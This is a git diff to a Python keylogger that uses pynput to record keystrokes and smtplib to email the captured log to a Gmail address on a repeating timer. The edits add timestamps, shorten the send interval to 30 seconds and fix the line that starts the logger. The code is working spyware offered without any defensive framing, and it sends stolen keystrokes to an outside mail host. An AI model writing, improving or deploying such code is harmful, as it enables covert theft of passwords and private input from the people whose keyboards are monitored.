@@ -1,4 +1,5 @@
-import pynput, threading, smtplib
+import pynput, threading, smtplib, sys
+from datetime import datetime
 
 
 class Logger:
@@ -7,7 +8,7 @@ class Logger:
     def __init__(self,sendInterval,email,passwd):
 
         self.timer = sendInterval
-        self.log = 'keylogger capture:\n\n'
+        self.log = 'keylogger capture:\n' + str(datetime.now()) + '\n'
         self.email = email
         self.passwd = passwd
     
@@ -37,7 +38,7 @@ class Logger:
     
     def report(self):
         self.sendMail(self.email, self.passwd, "\n\n" + self.log)
-        self.log = ''
+        self.log = 'keylogger capture:\n' + str(datetime.now()) + '\n'
         timer = threading.Timer(self.timer,self.report)
         timer.start()
     
@@ -51,7 +52,7 @@ class Logger:
 #import keyLog
 #logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS') on another script
 
-logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS')
+logger = Logger(30,'benpro4433@gmail.com','apppass')
 try:
     logger.start()
 except KeyboardInterrupt:
